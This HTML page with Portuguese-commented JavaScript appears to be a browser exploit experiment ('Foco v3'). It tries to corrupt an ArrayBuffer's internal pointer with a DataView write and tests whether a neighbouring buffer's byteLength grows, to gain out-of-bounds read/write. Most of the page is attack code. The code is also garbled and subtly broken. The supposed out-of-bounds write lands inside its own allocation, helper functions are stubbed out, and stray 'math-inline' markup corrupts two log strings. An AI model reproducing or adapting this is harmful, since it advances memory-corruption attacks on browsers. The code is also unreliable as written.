<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Foco v3: Corrupção Ponteiro com Leak e Checagem byteLength</title>
    <style> /* ... estilos ... */ </style>
</head>
<body>
    <h1>Foco v3: Corrupção de Ponteiro Interno AB com Padrão Conhecido</h1>
    <p>Tenta sobrescrever [obj_ptr+10h] com 0xAAAAAAAA_AAAAAAAA.
       Verifica se targetBuffer.byteLength muda para um valor grande.</p>
    <button id="runBtn" onclick="runPointerCorruptionTest_v3()">Iniciar Teste v3</button>
    <div id="output"></div>

    <script>
        // ... (log, PAUSE, toHex, toHex64 - copiar do script v2) ...
        const log = (message, type = 'info', funcName = '') => { /* ... */ };
        const PAUSE = (ms = 50) => new Promise(resolve => setTimeout(resolve, ms));
        const toHex = (val, bits = 32) => { /* ... */ return '0x' + (Number(val) >>> 0).toString(16).toUpperCase().padStart(Math.ceil(bits/4), '0'); };
        const toHex64 = (high, low) => `0x${high.toString(16).toUpperCase().padStart(8, '0')}${low.toString(16).toUpperCase().padStart(8, '0')}`;

        // Suposição baseada nos seus logs do Teste 2 (OOB Read Pointer Leak)
        const LEAKED_POINTER_HIGH = 0xAAAAAAAA;
        const LEAKED_POINTER_LOW  = 0xAAAAAAAA;

        // O offset que causou o crash no teste anterior
        const CRITICAL_TOTAL_OFFSET = 32;

        const attemptPointerCorruption_v3 = async () => {
            const FNAME = 'attemptPointerCorruption_v3';
            log(`--- Iniciando Teste v3: Corrupção [obj_ptr+10h] com ${toHex64(LEAKED_POINTER_HIGH, LEAKED_POINTER_LOW)} ---`, 'test', FNAME);

            const controlBufferSize = 64;
            const targetBufferOriginalSize = 64;
            const numTargetBuffers = 20; // Reduzido para focar no primeiro e observar melhor
            const targetBuffers = [];

            const allocationSizeControl = controlBufferSize + CRITICAL_TOTAL_OFFSET + 8 + 64; // Garante espaço
            let controlBuffer, controlDv;
            try {
                controlBuffer = new ArrayBuffer(allocationSizeControl);
                controlDv = new DataView(controlBuffer);
                for (let i = 0; i < controlBufferSize; i++) controlDv.setUint8(i, 0xBB);
                for (let i = controlBufferSize; i < controlBuffer.byteLength; i++) controlDv.setUint8(i, 0xCC);
                log(`Buffer de controle (${allocationSizeControl} bytes) alocado.`, 'info', FNAME);
            } catch (e) {
                log(`Erro ao alocar buffer de controle: ${e.message}`, 'error', FNAME);
                return;
            }

            log(`Alocando ${numTargetBuffers} buffers alvo...`, 'info', FNAME);
            for (let i = 0; i < numTargetBuffers; i++) {
                try {
                    targetBuffers.push(new ArrayBuffer(targetBufferOriginalSize));
                } catch (e) { log(`Erro ao alocar buffer alvo ${i}: ${e.message}`, 'warn', FNAME); }
            }
            log(`${targetBuffers.length} buffers alvo alocados.`, 'info', FNAME);
            await PAUSE(100);

            let corruptionSuccess = false;
            let successInfo = "";

            const oobWriteAddress = controlBufferSize + CRITICAL_TOTAL_OFFSET;
            log(`Tentando escrita OOB U64 (valor <span class="math-inline">\{toHex64\(LEAKED\_POINTER\_HIGH, LEAKED\_POINTER\_LOW\)\}\) em ctrlDataEnd\+</span>{CRITICAL_TOTAL_OFFSET} (abs ${oobWriteAddress})`, 'info', FNAME);

            try {
                controlDv.setUint32(oobWriteAddress, LEAKED_POINTER_LOW, true);
                controlDv.setUint32(oobWriteAddress + 4, LEAKED_POINTER_HIGH, true);
                log(`Escrita OOB U64 parece OK. Verificando targetBuffers[0].byteLength...`, 'info', FNAME);
                await PAUSE(200);

                const target = targetBuffers[0];
                if (target) {
                    const originalLength = targetBufferOriginalSize;
                    try {
                        const newLength = target.byteLength;
                        log(`targetBuffers[0].byteLength ANTES da tentativa era ${originalLength}`, 'info', FNAME);
                        log(`targetBuffers[0].byteLength AGORA é <span class="math-inline">\{toHex\(newLength\)\} \(</span>{newLength})`, newLength !== originalLength ? 'vuln' : 'info', FNAME);

                        if (newLength !== originalLength && newLength > originalLength + 0x1000 ) { // Heurística para tamanho "grande"
                            log(`!!! SUCESSO POTENCIAL !!! byteLength do targetBuffers[0] mudou para um valor grande!`, 'critical', FNAME);
                            log(`   Offset usado: ctrlDataEnd+${CRITICAL_TOTAL_OFFSET}`, 'critical', FNAME);
                            log(`   Ponteiro escrito: ${toHex64(LEAKED_POINTER_HIGH, LEAKED_POINTER_LOW)}`, 'critical', FNAME);
                            log(`   Novo byteLength: ${toHex(newLength)}`, 'critical', FNAME);
                            corruptionSuccess = true;
                            successInfo = `Buffer 0, Offset Total ${CRITICAL_TOTAL_OFFSET}, Novo Tamanho ${toHex(newLength)}`;

                            // TENTAR LER/ESCREVER ALÉM DO LIMITE ORIGINAL
                            const corruptedView = new DataView(target);
                            const readAddr = originalLength + 0x10; // Ler um pouco além do limite original
                            const writeAddr = originalLength + 0x20;
                            const testPattern = 0xDEADBEEF;
                            try {
                                log(`Tentando leitura em ${toHex(readAddr)} no buffer corrompido...`, 'info', FNAME);
                                let val = corruptedView.getUint32(readAddr, true);
                                log(` -> LIDO do buffer corrompido @${toHex(readAddr)}: ${toHex(val)}`, 'leak', FNAME);

                                log(`Tentando escrita de ${toHex(testPattern)} em ${toHex(writeAddr)} no buffer corrompido...`, 'info', FNAME);
                                corruptedView.setUint32(writeAddr, testPattern, true);
                                val = corruptedView.getUint32(writeAddr, true);
                                if (val === testPattern) {
                                    log(` ---> SUCESSO NA ESCRITA/LEITURA AMPLIADA! Leu ${toHex(val)} de volta.`, 'escalation', FNAME);
                                } else {
                                    log(` ---> FALHA na verificação da escrita ampliada. Leu ${toHex(val)} em vez de ${toHex(testPattern)}.`, 'warn', FNAME);
                                }
                            } catch(eRW) {
                                log(`ERRO ao tentar R/W ampliado: ${eRW.message}`, 'error', FNAME);
                            }

                        } else if (newLength !== originalLength) {
                            log(`AVISO: byteLength mudou, mas não para um valor significativamente grande. Novo: ${toHex(newLength)}`, 'warn', FNAME);
                        }
                    } catch (eAccess) {
                        log(`!!! CRASH/ERRO AO ACESSAR byteLength do targetBuffers[0] após corrupção!!!`, 'critical', FNAME);
                        log(`   Offset usado: ctrlDataEnd+${CRITICAL_TOTAL_OFFSET}`, 'critical', FNAME);
                        log(`   Ponteiro escrito: ${toHex64(LEAKED_POINTER_HIGH, LEAKED_POINTER_LOW)}`, 'critical', FNAME);
                        log(`   Erro: ${eAccess.message}`, 'vuln', FNAME);
                        corruptionSuccess = true; // O crash ainda é uma evidência
                        successInfo = `Buffer 0, Offset Total ${CRITICAL_TOTAL_OFFSET}, CRASH ao acessar byteLength`;
                    }
                } else {
                    log("targetBuffers[0] não está disponível.", "warn", FNAME);
                }
            } catch (eWrite) {
                log(`Escrita OOB U64 FALHOU/Bloqueada: ${eWrite.message}`, 'error', FNAME);
            }

            if (corruptionSuccess) {
                log(`--- EVIDÊNCIA DE CORRUPÇÃO DE PONTEIRO ENCONTRADA: ${successInfo} ---`, 'test', FNAME);
                alert(`EVIDÊNCIA DE CORRUPÇÃO ENCONTRADA!\n${successInfo}\nVerifique logs.`);
            } else {
                log("--- Nenhuma evidência de corrupção (crash ou alteração significativa de byteLength) detectada. ---", 'test', FNAME);
            }
        };

        const runPointerCorruptionTest_v3 = async () => {
            if (runBtn) runBtn.disabled = true;
            outputDiv.innerHTML = '';
            log("==== INICIANDO TESTE v3 DE CORRUPÇÃO DE PONTEIRO INTERNO ====", 'test', 'Main');
            await attemptPointerCorruption_v3();
            log("\n==== TESTE v3 DE CORRUPÇÃO DE PONTEIRO CONCLUÍDO ====", 'test', 'Main');
            if (runBtn) runBtn.disabled = false;
        };
    </script>
</body>
</html>
